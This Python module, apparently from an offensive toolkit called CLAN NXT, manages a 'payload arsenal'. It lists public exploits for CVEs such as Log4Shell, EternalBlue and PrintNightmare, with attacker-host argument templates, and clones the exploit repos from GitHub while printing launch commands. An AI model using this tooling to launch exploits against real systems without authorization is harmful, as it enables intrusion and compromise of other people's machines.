#!/usr/bin/env python3
"""
CLAN NXT Toolkit - Payload Manager
Store, manage, and deploy cybersecurity payloads and exploits.
"""

import os
import sys
import json
import subprocess
import shutil
from datetime import datetime
from pathlib import Path

from modules.banner import (
    C, clear_screen, print_header, print_menu_option,
    print_status, get_input, print_table, print_separator,
    print_result_box, loading_animation, confirm_action
)
from modules.utils import (
    load_json, save_json, PAYLOADS_FILE, DATA_DIR, run_command, log_action
)

DEFAULT_PAYLOADS = {
    "payloads": [
        {"id":1,"name":"PostgreSQL Copy-Fail RCE","cve":"CVE-2026-31431","category":"Database","severity":"CRITICAL",
         "description":"PostgreSQL pre-auth RCE via Copy-Fail protocol message buffer overflow.",
         "source":"https://github.com/theori-io/copy-fail-CVE-2026-31431","script":"copy_fail_exp.py",
         "language":"python3","args":"--target <IP> --port 5432 --cmd <CMD>",
         "tags":["rce","postgresql","pre-auth"],"added":"2026-05-01","tested":True},
        {"id":2,"name":"Log4Shell JNDI Injection","cve":"CVE-2021-44228","category":"Application",
         "severity":"CRITICAL","description":"Apache Log4j2 JNDI RCE via crafted log messages.",
         "source":"https://github.com/kozmer/log4j-shell-poc","script":"poc.py","language":"python3",
         "args":"--userip <ATTACKER_IP> --webport 8888 --lport 9001",
         "tags":["rce","java","log4j"],"added":"2024-01-15","tested":True},
        {"id":3,"name":"Spring4Shell RCE","cve":"CVE-2022-22965","category":"Application",
         "severity":"CRITICAL","description":"Spring Framework RCE via data binding on JDK 9+.",
         "source":"https://github.com/BobTheShoplifter/Spring4Shell-POC","script":"exploit.py",
         "language":"python3","args":"--url <TARGET_URL>",
         "tags":["rce","java","spring"],"added":"2024-03-20","tested":True},
        {"id":4,"name":"Sudo Baron Samedit","cve":"CVE-2021-3156","category":"PrivEsc",
         "severity":"HIGH","description":"Heap overflow in sudo for local root escalation.",
         "source":"https://github.com/blasty/CVE-2021-3156","script":"exploit_nss.py",
         "language":"python3","args":"","tags":["privesc","linux","sudo"],"added":"2024-02-10","tested":True},
        {"id":5,"name":"Dirty Pipe Kernel","cve":"CVE-2022-0847","category":"PrivEsc",
         "severity":"HIGH","description":"Linux kernel pipe exploit for local privilege escalation.",
         "source":"https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits","script":"exploit-1.c",
         "language":"c","args":"<SUID_BINARY>","tags":["privesc","linux","kernel"],"added":"2024-04-05","tested":True},
        {"id":6,"name":"PrintNightmare RCE","cve":"CVE-2021-34527","category":"Windows",
         "severity":"CRITICAL","description":"Windows Print Spooler RCE for SYSTEM access.",
         "source":"https://github.com/cube0x0/CVE-2021-1675","script":"CVE-2021-1675.py",
         "language":"python3","args":"<DOMAIN>/<USER>:<PASS>@<TARGET> '\\\\<ATTACKER>\\share\\evil.dll'",
         "tags":["rce","windows","spooler"],"added":"2024-05-12","tested":True},
        {"id":7,"name":"EternalBlue SMB","cve":"CVE-2017-0144","category":"Windows",
         "severity":"CRITICAL","description":"SMBv1 buffer overflow for Windows RCE (NSA exploit).",
         "source":"https://github.com/3ndG4me/AutoBlue-MS17-010","script":"eternalblue_exploit7.py",
         "language":"python2","args":"<TARGET_IP> <SHELLCODE>",
         "tags":["rce","windows","smb"],"added":"2024-01-01","tested":True},
        {"id":8,"name":"Shellshock Bash RCE","cve":"CVE-2014-6271","category":"Application",
         "severity":"HIGH","description":"GNU Bash env variable injection via CGI scripts.",
         "source":"https://github.com/opsxcq/exploit-CVE-2014-6271","script":"exploit.py",
         "language":"python3","args":"-t <TARGET_CGI_URL> -c <CMD>",
         "tags":["rce","linux","bash"],"added":"2024-01-20","tested":True},
    ]
}

def init_payloads():
    if not PAYLOADS_FILE.exists():
        save_json(PAYLOADS_FILE, DEFAULT_PAYLOADS)
    data = load_json(PAYLOADS_FILE)
    if not data or "payloads" not in data:
        save_json(PAYLOADS_FILE, DEFAULT_PAYLOADS)
        return DEFAULT_PAYLOADS
    return data

def list_payloads(data):
    payloads = data.get("payloads", [])
    if not payloads:
        print_status("No payloads found.", "warning")
        return
    print_header("PAYLOAD ARSENAL", f"{len(payloads)} payloads loaded")
    headers = ["#", "Name", "CVE", "Category", "Severity"]
    rows = [[str(p["id"]),p["name"][:35],p.get("cve","N/A"),p.get("category","N/A"),p.get("severity","N/A")] for p in payloads]
    print_table(headers, rows, "Saved Payloads")

def view_payload_detail(data, payload_id):
    payload = next((p for p in data.get("payloads",[]) if p["id"]==payload_id), None)
    if not payload:
        print_status(f"Payload #{payload_id} not found.", "error"); return
    print_header(f"PAYLOAD: {payload['name']}")
    for k,v in [("CVE",payload.get("cve")),("Category",payload.get("category")),
                ("Severity",payload.get("severity")),("Language",payload.get("language")),
                ("Source",payload.get("source")),("Script",payload.get("script")),
                ("Args",payload.get("args")),("Tags",", ".join(payload.get("tags",[])))]:
        print(f"    {C.GR}{k}:{C.RST}  {C.W}{v}{C.RST}")
    print(f"\n    {C.GR}Description:{C.RST} {C.W}{payload.get('description','')}{C.RST}\n")
    print_separator("─")
    print_menu_option("1","Clone & Run"); print_menu_option("2","Copy command"); print_menu_option("0","Back")
    ch = get_input(f"payload/{payload['name'][:12]}")
    if ch=="1": clone_and_run_payload(payload)
    elif ch=="2":
        cmd=f"{payload.get('language','python3')} {payload.get('script','')} {payload.get('args','')}"
        print_status(f"Command: {C.W}{cmd}{C.RST}","info")

def clone_and_run_payload(payload):
    source = payload.get("source","")
    if not source or "github.com" not in source:
        print_status("No valid GitHub source.","error"); return
    parts = source.replace("https://github.com/","").split("/")
    if len(parts)<2: print_status("Bad URL.","error"); return
    repo_url = f"https://github.com/{parts[0]}/{parts[1]}.git"
    exploit_dir = DATA_DIR/"exploits"; exploit_dir.mkdir(exist_ok=True)
    target_dir = exploit_dir/parts[1]
    if target_dir.exists():
        print_status(f"Already cloned: {target_dir}","info")
    else:
        print_status("Cloning...","working"); loading_animation("Downloading")
        rc,_,err = run_command(f"git clone {repo_url} {target_dir}")
        if rc!=0: print_status(f"Failed: {err}","error"); return
        print_status(f"Cloned: {target_dir}","success")
    print_result_box("USAGE",f"cd {target_dir}\n{payload.get('language','python3')} {payload.get('script','')} {payload.get('args','')}",C.R)
    log_action("PAYLOAD_CLONE",payload["name"])

def add_payload(data):
    print_header("ADD NEW PAYLOAD")
    name=input(f"  {C.CY}Name:{C.RST} ").strip()
    if not name: print_status("Name required.","error"); return data
    cve=input(f"  {C.CY}CVE:{C.RST} ").strip() or "N/A"
    cat=input(f"  {C.CY}Category:{C.RST} ").strip() or "General"
    sev=input(f"  {C.CY}Severity (CRITICAL/HIGH/MEDIUM/LOW):{C.RST} ").strip().upper() or "MEDIUM"
    desc=input(f"  {C.CY}Description:{C.RST} ").strip()
    src=input(f"  {C.CY}Source URL:{C.RST} ").strip()
    script=input(f"  {C.CY}Script file:{C.RST} ").strip()
    lang=input(f"  {C.CY}Language:{C.RST} ").strip() or "python3"
    args=input(f"  {C.CY}Arguments:{C.RST} ").strip()
    tags=[t.strip() for t in input(f"  {C.CY}Tags (comma-sep):{C.RST} ").strip().split(",")]
    nid = max((p["id"] for p in data.get("payloads",[])),default=0)+1
    data["payloads"].append({"id":nid,"name":name,"cve":cve,"category":cat,"severity":sev,
        "description":desc,"source":src,"script":script,"language":lang,"args":args,
        "tags":tags,"added":datetime.now().strftime("%Y-%m-%d"),"tested":False})
    save_json(PAYLOADS_FILE, data)
    print_status(f"Payload '{name}' added (ID:{nid})","success")
    log_action("PAYLOAD_ADD",name); return data

def search_payloads(data):
    q=input(f"  {C.CY}Search:{C.RST} ").strip().lower()
    if not q: return
    results=[p for p in data.get("payloads",[]) if q in f"{p['name']} {p.get('cve','')} {' '.join(p.get('tags',[]))}".lower()]
    if not results: print_status("No matches.","warning"); return
    headers=["#","Name","CVE","Severity"]
    rows=[[str(p["id"]),p["name"][:35],p.get("cve","N/A"),p.get("severity","N/A")] for p in results]
    print_table(headers,rows,f"Results: '{q}'")

def delete_payload(data):
    pid=input(f"  {C.CY}Payload ID to delete:{C.RST} ").strip()
    try: pid=int(pid)
    except: print_status("Invalid ID.","error"); return data
    found=next((p for p in data.get("payloads",[]) if p["id"]==pid),None)
    if not found: print_status("Not found.","error"); return data
    if confirm_action(f"Delete '{found['name']}'?"):
        data["payloads"]=[p for p in data["payloads"] if p["id"]!=pid]
        save_json(PAYLOADS_FILE,data); print_status("Deleted.","success")
    return data

def payload_manager():
    data = init_payloads()
    while True:
        clear_screen()
        print(f"\n{C.R}  ╔══════════════════════════════════════════════════╗{C.RST}")
        print(f"{C.R}  ║{C.RST}  {C.W}{C.BOLD}⚡ PAYLOAD ARSENAL{C.RST}                              {C.R}║{C.RST}")
        print(f"{C.R}  ╚══════════════════════════════════════════════════╝{C.RST}\n")
        print_menu_option("1","List All Payloads","View saved payloads")
        print_menu_option("2","View Payload Details","Deep-dive into a payload")
        print_menu_option("3","Add New Payload","Add exploit to database")
        print_menu_option("4","Search Payloads","Search by name/CVE/tag")
        print_menu_option("5","Delete Payload","Remove from arsenal")
        print_menu_option("0","Back to Main Menu")
        ch = get_input("payloads")
        if ch=="1": data=init_payloads(); list_payloads(data); get_input("enter")
        elif ch=="2":
            list_payloads(data)
            try: view_payload_detail(data,int(input(f"\n  {C.CY}Payload ID:{C.RST} ")))
            except: print_status("Invalid.","error")
            get_input("enter")
        elif ch=="3": data=add_payload(data); get_input("enter")
        elif ch=="4": search_payloads(data); get_input("enter")
        elif ch=="5": list_payloads(data); data=delete_payload(data); get_input("enter")
        elif ch in ("0","back","exit","quit"): break
